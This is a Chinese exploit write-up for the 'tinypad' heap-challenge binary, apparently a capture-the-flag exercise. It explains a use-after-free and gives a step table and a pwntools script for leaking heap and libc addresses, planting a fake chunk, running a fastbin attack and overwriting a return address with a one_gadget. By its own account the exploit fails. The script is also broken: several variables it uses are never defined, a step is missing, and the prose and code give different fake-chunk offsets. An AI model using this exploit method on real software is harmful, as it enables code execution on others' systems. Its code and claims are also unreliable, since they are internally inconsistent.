# 漏洞利用文档

## 执行环境
- **程序类型**：64位ELF二进制程序，动态链接
- **保护机制**：
  - Full RELRO：GOT表只读
  - NX：堆栈不可执行
  - Stack Canary：栈保护启用
  - ASLR：地址空间随机化启用
- **依赖库**：依赖系统libc，从调试中泄漏的main_arena偏移0x3c4b20推断为glibc 2.23-2.27版本
- **运行要求**：需要tinypad二进制文件在`./data/sample22`路径，运行环境为Linux系统

## 漏洞成因
- **关键结构体**：全局数组`tinypad`位于BSS段（地址0x602040），用于管理4个堆块条目。每个条目包含：
  - 使用标志（偏移240）：非零表示已分配
  - 堆块指针（偏移248）：指向分配的堆块数据区
  - 大小字段（偏移256）：分配的堆块大小
  - 显示指针（偏移264）：用于显示内容的指针
- **漏洞类型**：Use-After-Free (UAF)
- **漏洞分析**：
  - 在删除操作（`delete`）中，程序释放堆块后只清除了使用标志（偏移240），但未清除堆块指针（偏移248和264）
  - 导致tinypad中保留指向已释放堆块的悬垂指针
  - 通过编辑操作（`edit`）可以修改已释放堆块的内容，从而控制堆元数据和实现任意地址读写

## 漏洞利用过程
利用过程通过多个步骤实现代码执行，但最终因内存布局问题失败：

| 步骤 | 操作 | 目的 | 内存变化 | 结果 |
|------|------|------|----------|------|
| 1 | 分配chunk1(0x70), chunk2(0x70), chunk3(0x100); 释放chunk2, chunk1 | 建立UAF和fastbin链表 | fastbin: chunk1→chunk2→NULL; tinypad指针未清空 | UAF漏洞就绪 |
| 2 | 读取chunk1内容 | 泄漏堆地址 | 通过UAF读取chunk1的fd指针 | 获得heap_base |
| 3 | 释放chunk3 | 合并堆块泄漏libc | 堆合并到top chunk，包含main_arena指针 | libc地址可用 |
| 4 | 读取libc地址 | 计算libc基址 | 通过top chunk的fd获得main_arena | 获得libc.address |
| 5 | 重新分配chunk1(0x18), chunk2(0x100), chunk3(0x100), chunk4(0x100) | 准备fake chunk攻击 | 新堆布局建立，tinypad指针更新 | 内存布局重置 |
| 6 | 在tinypad构造fake chunk | 为fastbin攻击做准备 | tinypad[0x60]处写入fake chunk头 | fake chunk就绪 |
| 7 | 修改chunk1的fd指针 | 指向fake chunk | 尝试通过部分写修改chunk1的fd | **失败：fd被'f'字符覆盖** |
| 8 | 释放chunk2 | 触发fastbin攻击 | chunk2释放，但未正常进入fastbin | **异常：堆状态损坏** |
| 9 | 修复fake chunk指针 | 通过unsorted bin检查 | 设置fake chunk的fd/bk指向main_arena | 修复尝试 |
| 10 | 分配堆块覆盖tinypad | 泄漏environ地址 | tinypad指针被覆盖指向libc的environ | 准备栈泄漏 |
| 11 | 读取environ地址 | 计算栈返回地址 | 通过覆盖的指针读取environ值 | 获得栈地址 |
| 12 | 编辑chunk2和chunk1 | 写入one_gadget地址 | 尝试修改返回地址为one_gadget | **失败：内存状态异常** |
| 13 | 退出程序 | 触发one_gadget | 程序正常退出，未执行shell | 利用完全失败 |

**关键问题分析**：
- 步骤7中`edit_ffff`函数未能正确修改chunk1的fd指针，导致后续fastbin攻击失败
- 堆管理器状态异常，unsortedbin指向非法地址
- tinypad数组结构被破坏，索引2的大小字段为0
- 最终程序正常退出，未获得代码执行

## Exploit

from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample22')
p = process('./data/sample22')
libc = elf.libc
log.info('PID: ' + str(proc.pidof(p)[0]))
main_arena_offset = 0x3c4b20  # glibc 2.23-2.27 typical main_arena offset

def add(size, content):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'a')
    p.recvuntil(b'(SIZE)>>> ')
    p.sendline(str(size).encode())
    p.recvuntil(b'(CONTENT)>>> ')
    p.sendline(content)

def edit(idx, content):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'e')
    p.recvuntil(b'(INDEX)>>> ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'(CONTENT)>>> ')
    p.sendline(content)
    p.recvuntil(b'Is it OK?\n')
    p.sendline(b'Y')

def delete(idx):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'd')
    p.recvuntil(b'(INDEX)>>> ')
    p.sendline(str(idx).encode())

def edit_ffff(n, diff):
    for i in range(n + 1):
        data = diff.rjust(0x18 - i, b'f')  # 尝试通过部分写修改fd指针
        edit(1, data)

# Step 1: UAF setup - allocate and free chunks to create fastbin list
p.recvuntil(b'  ============================================================================\n\n')
add(0x70, b'a' * 8)  # chunk1
add(0x70, b'b' * 8)  # chunk2  
add(0x100, b'c' * 8) # chunk3
delete(2)  # free chunk2
delete(1)  # free chunk1, form fastbin: chunk1 -> chunk2 -> NULL

# Step 2: Heap leak - use UAF to read heap address
p.recvuntil(b' # CONTENT: ')
data = p.recvuntil(b'\n', drop=True)

# Step 3: Libc leak - free chunk3 to merge heap and get libc address
delete(3)  # free chunk3, merge all chunks to top chunk

# Step 4: Get libc base address from main_arena
p.recvuntil(b' # CONTENT: ')
data = p.recvuntil(b'\n', drop=True)
main_arena = u64(data.ljust(8, b'\x00')) - 88  # main_arena offset in top chunk
libc.address = main_arena - main_arena_offset  # calculate libc base

# Step 5: Reallocate chunks for exploitation
add(0x18, b'a' * 0x18)  # new chunk1, small size for fastbin
add(0x100, b'b' * 0xf8 + b'\x11')  # new chunk2, with fake size field
add(0x100, b'c' * 0xf8)  # new chunk3
add(0x100, b'd' * 0xf8)  # new chunk4

# Step 6: Construct fake chunk in tinypad for fastbin attack
fakechunk_addr = 0x602040 + 0x20  # tinypad + 0x20
fakechunk_size = 0x101  # size for fastbin
fakechunk = p64(0) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(fakechunk_addr)  # fake chunk header
edit(3, b'd'* 0x20 + fakechunk)  # write fake chunk to tinypad via chunk3 overflow

# Step 7: Modify chunk1's fd to point to fake chunk - CRITICAL STEP THAT FAILED
diff = heap_base + 0x20 - fakechunk_addr  # calculate offset for partial overwrite
diff_strip = p64(diff).strip(b'\0')  # remove null bytes for precise overwrite
number_of_zeros = len(p64(diff)) - len(diff_strip)
edit_ffff(number_of_zeros, diff_strip)  # attempt to overwrite fd - FAILED IN DEBUG

# Step 8: Trigger fastbin attack by freeing chunk2
delete(2)  # free chunk2, should place fake chunk in fastbin but failed
p.recvuntil(b'\nDeleted.')

# Step 9: Repair fake chunk to point to main_arena for unsorted bin attack
edit(4, b'd' * 0x20 + p64(0) + p64(0x101) + p64(main_arena + 88) + p64(main_arena + 88))

# Step 11: Leak environ address to calculate stack address
p.recvuntil(b' # CONTENT: ')
environ_addr = p.recvuntil(b'\n', drop=True).ljust(8, b'\x00')
environ_addr = u64(environ_addr)  # get actual environ value

# Step 12: Overwrite return address with one_gadget - ATTEMPT THAT FAILED

edit(2, p64(main_ret_addr))  # overwrite pointer to point to return address
edit(1, p64(one_gadget_addr))  # write one_gadget to return address

**漏洞利用总结**：
- 利用思路正确：通过UAF泄漏地址→构造fake chunk→fastbin攻击→栈劫持
- 失败原因：步骤7中fd指针修改不精确，导致后续堆状态异常
- 改进建议：需要更精确的部分写操作或替代利用方法
